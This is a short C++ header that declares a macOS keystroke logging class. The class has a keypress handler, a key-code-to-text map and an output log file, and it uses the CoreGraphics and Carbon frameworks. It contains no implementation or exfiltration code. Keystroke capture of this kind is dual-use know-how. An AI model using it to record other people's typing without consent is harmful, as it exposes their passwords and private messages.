#pragma once

#if defined(__APPLE__)
#include <iostream>
#include <fstream>
#include <string>
#include <unordered_map>
#include <ctime>
#include <chrono>
#include <stdexcept>
#include <filesystem>

#include <CoreGraphics/CoreGraphics.h>
#include <Carbon/Carbon.h>

class MacOsLogger
{
public:
    explicit MacOsLogger(const std::filesystem::path& logFilePath);
    ~MacOsLogger();

    void startLogging();

private:
    void handleKeyPress(CGKeyCode keyCode);
    std::string convertKeyCode(int keyCode) const;
    void initializeKeyMap();

    std::filesystem::path logFilePath;
    std::ofstream logFile;
    std::unordered_map<int, std::string> keyMap;
};

#endif
